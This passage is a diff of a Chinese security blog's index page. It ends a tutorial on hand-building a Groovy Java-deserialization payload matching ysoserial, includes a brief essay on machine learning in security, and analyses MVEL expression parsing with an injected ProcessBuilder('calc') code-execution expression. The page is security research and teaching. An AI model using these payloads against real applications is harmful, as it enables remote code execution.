+<p>就像你可以在上面的代码中看到的，我们现在终于有了invocationhandler，它就是ConvertedClosure对象。你可以通过反编译Groovy库来确认这一点，当你看到ConvertedClosure类时，你会看到它扩展了ConversionHandler类，如果你反编译该类你将看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public abstract class ConversionHandler</div><div class="line">implements InvocationHandler, Serializable</div></pre></td></tr></table></figure></p>
+<p> 实现InvocationHandler的事实解释了为什么我们可以在Proxy对象中使用它。然而，我不明白的一件事是，Groovy payload<br> 是从Map代理调用到实际代码执行的。您可以使用反编译器来查看Groovy库，但是通常我发现可以使用谷歌查询补充代码阅读来了解它。一个挑战<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groovy execute shell <span class="built_in">command</span></div></pre></td></tr></table></figure></p>
+<p> 上面的查询可能会让你在各种各样的页面上找到答案。这实质上告诉我们，显然String对象有一个额外的方法是“execute”。我经常使用上述查询来处理我不熟悉的环境，因为执行shell命令通常是开发人员需要的，通常可以在互联网上找到答案。这有助于我完整地了解这个payload的工作原理，现在可以看出如下关系：<br> <img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br> 完整的代码在<a href="https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7" target="_blank" rel="external">这里</a>。编译，执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac -cp DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate.java</div><div class="line">java -cp .:DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate &gt; payload_manual.bin</div></pre></td></tr></table></figure></p>
+<p>当我们使用python exploit开发它时，它应该具有与ysoserial payload完全相同的结果。令我吃惊的是，payload甚至有相同的哈希：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sha256sum payload_ping_localhost.bin payload_manual.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_ping_localhost.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_manual.bin</div></pre></td></tr></table></figure></p>
+<p>感谢您抽出时间阅读本文，更重要的是，我希望它可以帮助您利用Java反序列化漏洞以及更好地了解它们。<br>参考链接：<br><a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical</a><br><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</a><br><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_blank" rel="external">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a><br><a href="http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html" target="_blank" rel="external">http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html</a><br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="external">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a><br><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478" target="_blank" rel="external">https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a><br><a href="https://www.youtube.com/watch?v=VviY3O-euVQ" target="_blank" rel="external">https://www.youtube.com/watch?v=VviY3O-euVQ</a><br><a href="http://wouter.coekaerts.be/2015/annotationinvocationhandler" target="_blank" rel="external">http://wouter.coekaerts.be/2015/annotationinvocationhandler</a><br><a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">http://www.baeldung.com/java-dynamic-proxies</a><br><a href="https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy" target="_blank" rel="external">https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy</a><br><a href="https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful" target="_blank" rel="external">https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/09/12/Java反序列化漏洞利用的学习与实践/" data-id="cja0q26ez0005u41bph1kax0c" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-机器学习再信息安全中的应用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/11/机器学习再信息安全中的应用/" class="article-date">
+  <time datetime="2017-08-11T08:44:31.000Z" itemprop="datePublished">2017-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前段时间听了一个”机器学习在信息安全中的应用”的讲座，后来自己又做了一些思考，在此做一个总结。<br>在和黑客对抗的过程中，面对的威胁有3个不同的认知程度：<br>1.已知的威胁。<br>2.已知的未知的威胁。<br>3.未知的未知的威胁。<br>很多时候，在做产品、做运营和做研究的时，最大的恐惧是面对一个最未知的恐惧；因为只要知道这个情况是已知的，又很多技术手段都是可以解决的。<br>首先我们说一下如何定义和衡量已知和未知。从安全角度来说比较容易：<br>已知的已知就是我如果在做一个产品，我自己每天能看见的，能检测到的；<br>已知的未知就是我自己看不见，也检测不到，但是友商们都有检测；<br>未知的未知确实就是我不知道，除非它发生了，被通过某些机缘巧合的情况下暴露了出来，这个情况下，才会换成我们所谓的已知的未知。<br>做安全的，不管是甲方还是乙方，面临同样的挑战，就是一个事情只要我知道，我所有的分析，所有的IOC，所有的威胁情报都能跟上去，但如果这个事情我不知道，那真是无从下手。<br>其实在每一个层次上面，我们也可以横向定义到我们的产品，我们的运营上面去，我们怎么样去衡量你是不是在这个层次上做得比较好。<br>1.要解决的是效果问题。<br>这些效果包括我的检出率、召回率、误报率，就是这些不同的指标。但是更重要的是运营的，我怎么去衡量。不管你做任何的系统，你如果一天摔给我1000个报警，那我绝对不可能响应的过来的，所以运营就是事件可响应的数量不能太多。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/08/11/机器学习再信息安全中的应用/" data-id="cja0q26gc000du41bgpe4a62z" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +313,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cj5p9bvxp000cd01bb4sevlle" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cja0q26gd000fu41bvaq3nj8b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -169,10 +323,10 @@
 
 
   
-    <article id="post-甲乙方安全需求与痛点" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-MVEL解析表达式" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2017/07/04/甲乙方安全需求与痛点/" class="article-date">
-  <time datetime="2017-07-04T05:57:12.000Z" itemprop="datePublished">2017-07-04</time>
+    <a href="/2016/11/15/MVEL解析表达式/" class="article-date">
+  <time datetime="2016-11-15T07:04:40.000Z" itemprop="datePublished">2016-11-15</time>
 </a>
     
   </div>
@@ -183,7 +337,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/04/甲乙方安全需求与痛点/">甲乙方安全需求与痛点</a>
+      <a class="article-title" href="/2016/11/15/MVEL解析表达式/">MVEL解析表达式</a>
     </h1>
   
 
@@ -191,11 +345,65 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h3 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h3><p>在google搜索Expression Language时，发现在维基百科中相关的词条叫做“统一表达式语言”。再次词条的引用部分，被一行内容吸引到：</p>
+<blockquote>
+<p>MVEL - 一个被众多Java项目使用的开源的表达式语言。</p>
+</blockquote>
+<p>最流行的内容研究的现阶段价值也就最大，攻防更是如此。所以，我打算在JWEI的研究中，先拿它来开刀。</p>
+<p>本篇文章将针对MVEL解析表达式的过程进行简单的分析，来帮助我们在未来的研究中探索这种表达式的特性。</p>
+<h3 id="0x01-MVEL表达式执行方法"><a href="#0x01-MVEL表达式执行方法" class="headerlink" title="0x01 MVEL表达式执行方法"></a>0x01 MVEL表达式执行方法</h3><p>MVEL运行时提供给使用者两种使用模式——解释模式和编译模式。解释模式是一种无状态的即时编译并执行的特设模式，不会产生中间产物，但是表达式执行的速度会减慢。编译模式会产生大量的编译中间产物，用于缓存和预执行，但是执行速度比解释模式更快。</p>
+<p>以上是官方文档中向使用者描述的两种使用方法，下面我们来看下，官方对于这两种模式的实现示例。</p>
+<p>####解释模式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> org.mvel.MVEL;</div><div class="line"></div><div class="line">   <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MVELTest</span> </span>&#123;</div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">               String expression = <span class="string">"foobar &gt; 99"</span>;</div><div class="line"></div><div class="line">               Map vars = <span class="keyword">new</span> HashMap();</div><div class="line">               vars.put(<span class="string">"foobar"</span>, <span class="keyword">new</span> Integer(<span class="number">100</span>));</div><div class="line"></div><div class="line">               <span class="comment">// We know this expression should return a boolean.</span></div><div class="line">               Boolean result = (Boolean) MVEL.eval(expression, vars);</div><div class="line"></div><div class="line">               <span class="keyword">if</span> (result.booleanValue()) &#123;</div><div class="line">                   System.out.println(<span class="string">"It works!"</span>);</div><div class="line">              &#125;</div><div class="line">         &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
+<p>####编译模式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> org.mvel.MVEL;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MVELTest2</span> </span>&#123;</div><div class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">            String expression = <span class="string">"foobar &gt; 99"</span>;</div><div class="line"></div><div class="line">            <span class="comment">// Compile the expression.</span></div><div class="line">            Serializable compiled = MVEL.compileExpression(expression);</div><div class="line"></div><div class="line">            Map vars = <span class="keyword">new</span> HashMap();</div><div class="line">            vars.put(<span class="string">"foobar"</span>, <span class="keyword">new</span> Integer(<span class="number">100</span>));</div><div class="line"></div><div class="line">            <span class="comment">// Now we execute it.</span></div><div class="line">            Boolean result = (Boolean) MVEL.executeExpression(compiled, vars);</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (result.booleanValue()) &#123;</div><div class="line">                System.out.println(<span class="string">"It works!"</span>);</div><div class="line">           &#125;</div><div class="line">      &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>除了上面的两种调用方法，我在看ElasticSearch代码时，发现它使用了另外的一种方法，来实现MVEL的执行。这种方法属于编译模式，我的测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.mvel2.MVEL;</div><div class="line"><span class="keyword">import</span> org.mvel2.compiler.ExecutableStatement;</div><div class="line"><span class="keyword">import</span> org.mvel2.integration.impl.MapVariableResolverFactory;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MvelDemo</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        String expression = <span class="string">"foobar &gt; 99"</span>;</div><div class="line">        String str = <span class="string">"a=123"</span>;</div><div class="line">        String exp = <span class="string">";new java.lang.ProcessBuilder(\"calc\").start();"</span>;</div><div class="line">        MapVariableResolverFactory resolver = <span class="keyword">new</span> MapVariableResolverFactory(<span class="keyword">new</span> HashMap());</div><div class="line">        Map vars = <span class="keyword">new</span> HashMap();</div><div class="line">        vars.put(<span class="string">"foobar"</span>, <span class="keyword">new</span> Integer(<span class="number">100</span>));</div><div class="line">        ExecutableStatement script = (ExecutableStatement) MVEL.compileExpression(str+exp);</div><div class="line"></div><div class="line">        script.getValue(<span class="keyword">null</span>,resolver)；</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>即通过编译后的内容可以转换成ExecutableStatement类型，通过这种类型的getValue方法，也是可以执行表达式内容的。</p>
+<h3 id="0x02-解析执行过程"><a href="#0x02-解析执行过程" class="headerlink" title="0x02 解析执行过程"></a>0x02 解析执行过程</h3><p>我们分析过程中用来测试的表达式是：“a=123;new java.lang.ProcessBuilder(“calc”).start();”。</p>
+<p>测试代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.util.HashMap;</div><div class="line"><span class="keyword">import</span> java.util.Map;</div><div class="line"></div><div class="line"><span class="keyword">import</span> org.mvel2.MVEL;</div><div class="line"><span class="keyword">import</span> org.mvel2.compiler.ExecutableStatement;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MvelDemo</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</div><div class="line">        String exp = <span class="string">"a=123;new java.lang.ProcessBuilder(\"calc\").start();"</span>;</div><div class="line">        Map vars = <span class="keyword">new</span> HashMap();</div><div class="line">        vars.put(<span class="string">"foobar"</span>, <span class="keyword">new</span> Integer(<span class="number">100</span>));</div><div class="line">        String result = MVEL.eval(exp, vars).toString();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先进入到MVEL中的eval方法中，在这个方法中初始化MVELInterpretedRuntime类，并且调用它的parse方法。在parse方法中最主要的步骤是调用parseAndExecuteInterpreted方法，这个方法是解释模式中最终处理表达式执行的方法。我们来看它最开始的一部分代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">parseAndExecuteInterpreted</span><span class="params">()</span> </span>&#123;</div><div class="line">   ASTNode tk = <span class="keyword">null</span>;</div><div class="line">   <span class="keyword">int</span> operator;</div><div class="line">   lastWasIdentifier = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">     <span class="keyword">while</span> ((tk = nextToken()) != <span class="keyword">null</span>) &#123;</div><div class="line">       holdOverRegister = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">       <span class="keyword">if</span> (lastWasIdentifier &amp;&amp; lastNode.isDiscard()) &#123;</div><div class="line">         stk.discard();</div><div class="line">       &#125;</div><div class="line"></div><div class="line">       <span class="comment">/**</span></div><div class="line">        * If we are at the beginning of a statement, then we immediately push the first token</div><div class="line">        * onto the stack.</div><div class="line">        */</div><div class="line">       <span class="keyword">if</span> (stk.isEmpty()) &#123;</div><div class="line">         <span class="keyword">if</span> ((tk.fields &amp; ASTNode.STACKLANG) != <span class="number">0</span>) &#123;</div><div class="line">           stk.push(tk.getReducedValue(stk, ctx, variableFactory));</div><div class="line">           Object o = stk.peek();</div><div class="line">           <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Integer) &#123;</div><div class="line">             arithmeticFunctionReduction((Integer) o);</div><div class="line">           &#125;</div><div class="line">         &#125;</div><div class="line">         <span class="keyword">else</span> &#123;</div><div class="line">           stk.push(tk.getReducedValue(ctx, ctx, variableFactory));</div><div class="line">         &#125;</div></pre></td></tr></table></figure>
+<p>tk=nextToken()这条语句会将程序带入到AbstractParser这个类的nextToken方法中。而这个类的位置是org.mvel2.compiler.AbstractParser，我们在进入这个类后，可以看到下面这样的一行注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * This is the core parser that the subparsers extend.</div><div class="line"> *</div><div class="line"> * <span class="doctag">@author</span> Christopher Brock</div><div class="line"> */</div></pre></td></tr></table></figure>
+<p>由此可见，不管使用哪种执行表达式的方法，对于表达式的解析都是由这个类来完成的。我们继续来跟进nextToken的执行过程。</p>
+<p>初始化抓取标识capture，跳过debug这些内容，检测游标所指位置字符是否符合规范（标准的变量名），若符合则开启抓取（抓取标识置true），并且游标加一。然后判断此时游标字符是否符合规范，如果是则游标加一，不断往复。</p>
+<p>检测游标所指之前内容是否存在NEW、IF、CONTAINS等操作关键字，我们此时的内容为a，所以跳过这个环节。skipWhitespace方法跳过回车、换行和注释等空白内容，此时游标指在“=”。</p>
+<p>进入抓取循环，识别出当前字符为“=”，进入等号处理分支，在此分支的非操作符处理块中处理我们的表达式。先游标加一，此时游标指向“1”。通过captureToEOS方法抓取从当前位置到语句结束内容，即从“1”到分号前的内容（123），此时游标指向“;”。最后返回AssignmentNode实例，其中已解析完成语句内容（变量名a，值123）。</p>
+<p>返回到paraseAndExcuteInterpreted方法，通过返回节点实例的getReducedValue方法来处理“a=123”这条语句（通过递归解析子表达式）。AssignmentNode的getReduceValue处理语句两种方式，一种是对已存在的变量，进行操作后，然后返回上下文环境；另一种是对不存在的变量进行创建，然后通过getValue返回。代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getReducedValue</span><span class="params">(Object ctx, Object thisValue, VariableResolverFactory factory)</span> </span>&#123;</div><div class="line">  checkNameSafety(varName );</div><div class="line"></div><div class="line">  <span class="keyword">if</span> ( col) &#123;</div><div class="line">    PropertyAccessor.set(factory.getVariableResolver( varName).getValue(), factory, index, ctx = MVEL.eval( expr, start , offset , ctx, factory), pCtx);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">return</span> factory.createVariable(varName, MVEL. eval( expr, start , offset , ctx, factory)).getValue();</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> ctx;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里我们又进入了一个eval，不过这回eval的主角变成了“123”</p>
+<p>根据返回的内容创建SimpleSTValueResolver实例，调用getValue方法返回其值，然后压入到ExecutionStatck中。</p>
+<p><img src="/upload_image/MVEL-1.png" alt="1"></p>
+<p>下面继续循环内容，游标向后移至语句截止符“;”，nextToken返回截止节点信息</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">';'</span> :</div><div class="line"> cursor++;</div><div class="line"> lastWasIdentifier = <span class="keyword">false</span>;</div><div class="line">  <span class="keyword">return</span> lastNode = <span class="keyword">new</span> EndOfStatement(pCtx);</div></pre></td></tr></table></figure>
+<p><img src="/upload_image/MVEL-2.png" alt="2"></p>
+<p>ExecutionStatck不为空（之前已经压入了“123”）则继续向下执行，进入判断操作符分支。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> (procBooleanOperator(operator = tk.getOperator())) &#123;</div><div class="line">          <span class="keyword">case</span> RETURN :</div><div class="line">            variableFactory.setTiltFlag(<span class="keyword">true</span>);</div><div class="line">            <span class="keyword">return</span> stk .pop();</div><div class="line">          <span class="keyword">case</span> OP_TERMINATE :</div><div class="line">            <span class="keyword">return</span> stk .peek();</div><div class="line">          <span class="keyword">case</span> OP_RESET_FRAME :</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">          <span class="keyword">case</span> OP_OVERFLOW :</div><div class="line">            <span class="keyword">if</span> (!tk.isOperator()) &#123;</div><div class="line">              <span class="keyword">if</span> (!(stk .peek() <span class="keyword">instanceof</span> Class)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> CompileException(<span class="string">"unexpected token or unknown identifier:"</span> + tk.getName(), expr, st);</div><div class="line">              &#125;</div><div class="line">              variableFactory.createVariable(tk.getName(), <span class="keyword">null</span>, (Class) stk.peek());</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
+<p>分号属于OP_RESTE_FRAME，并且通过procBooleanOperator方法清空ExecutionStatck等残留信息。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> END_OF_STMT:</div><div class="line">    <span class="comment">/**</span></div><div class="line">     * Assignments are a special scenario for dealing with the stack.  Assignments are basically like</div><div class="line">     * held -over failures that basically kickstart the parser when an assignment operator is is</div><div class="line">     * encountered.  The originating token is captured, and the the parser is told to march on.  The</div><div class="line">     * resultant value on the stack is then used to populate the target variable.</div><div class="line">     *</div><div class="line">     * The other scenario in which we don't want to wipe the stack, is when we hit the end of the</div><div class="line">     * statement, because that top stack value is the value we want back from the parser.</div><div class="line">     */</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (hasMore()) &#123;</div><div class="line">      holdOverRegister = stk .pop();</div><div class="line">      stk.clear();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> OP_RESET_FRAME ;</div></pre></td></tr></table></figure>
+<p>然后进入下一循环，读取后面的语句。重复之前的捕获关键字的过程捕获到“NEW”（通过空格捕获到的），通过captureToNextTokenJunction 从当前位置抓取到下一个连接点（junction），此时游标指向“（”（“（）”中所包含的内容，应作为子语句所解析，所以“（”之前部分应先解析）。然后根据圆括号之前的内容，构造NewObjectPrototype实例，并以此构建节点，最后返回节点。</p>
+<p><img src="/upload_image/MVEL-3.png" alt="1"></p>
+<p>然后进入org.mvel2.ast.NewObjectNode中的getReducedValue，这里“123”那里差不多，使用org.mvel2.MVEL.eval来递归解析圆括号中的内容。就像“123”那样解析，不同的是被双引号包围，所以作为字符串来解析，返回Literal节点。然后压栈，进行一些后续操作，结束操作返回上一层调用（NewObjectNode那里）。</p>
+<p><img src="/upload_image/MVEL-4.png" alt=""></p>
+<p>后面就是通过反射构造实例，初始化执行的调用了。这里最需要注意的是org.mvel2.PropertyAccessor这个类，这个类中方法的调用大多是与反射相关的。所以一旦在分析过程中进入了这个类，并且调用了某个比较大的方法，那么很有可能这种MVEL表达式的用法会造成一些强大的破坏，例如这里：</p>
+<p><img src="/upload_image/MVEL-5.png" alt=""></p>
+<p>再然后就如同上一条语句那样，检测到语句结束字符“;”，返回上一层，结束解析和执行。</p>
+<h3 id="0x03-一些方法功能的记录"><a href="#0x03-一些方法功能的记录" class="headerlink" title="0x03 一些方法功能的记录"></a>0x03 一些方法功能的记录</h3><p><strong>AssignmentNode</strong> 创建节点实例，解析单条语句中的变量和值，或者方法操作。</p>
+<p><strong>balancedCapture</strong> 获取(、[分支中的内容。</p>
+<p><strong>captureStringLiteral</strong> 获取制定包围符中的字符串（if (expr[cursor] == ‘\\‘) cursor++;这句比较有趣）。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">captureStringLiteral</span><span class="params">(<span class="keyword">final</span> <span class="keyword">char</span> type, <span class="keyword">final</span> <span class="keyword">char</span>[] expr, <span class="keyword">int</span> cursor, <span class="keyword">int</span> end)</span> </span>&#123;</div><div class="line">  <span class="keyword">while</span> (++cursor &lt; end &amp;&amp; expr[cursor] != type) &#123;</div><div class="line">    <span class="keyword">if</span> (expr [cursor] == <span class="string">'\\'</span> ) cursor++;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (cursor &gt;= end || expr[cursor] != type) &#123;</div><div class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> CompileException(<span class="string">"unterminated string literal"</span> , expr , cursor);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> cursor;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>captureToEOS</strong>  抓取从当前位置到语句结束。</p>
+<p><strong>captureToNextTokenJunction</strong> 从当前位置抓取到下一个连接点（junction），即遇到“(”、“/”、“/*”和空白符时终止，遇到“[”则向后偏移至“]”。</p>
+<p><strong>captureContructorAndResidual</strong> 抓取()中的参数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] captureContructorAndResidual(<span class="keyword">char</span>[] cs, <span class="keyword">int</span> start, <span class="keyword">int</span> offset) &#123;</div><div class="line">  <span class="keyword">int</span> depth = <span class="number">0</span>;</div><div class="line">  <span class="keyword">int</span> end = start + offset;</div><div class="line">  <span class="keyword">boolean</span> inQuotes = <span class="keyword">false</span>;</div><div class="line">  <span class="keyword">for</span> ( <span class="keyword">int</span> i = start; i &lt; end; i++) &#123;</div><div class="line">    <span class="keyword">switch</span> (cs[i]) &#123;</div><div class="line">      <span class="keyword">case</span> 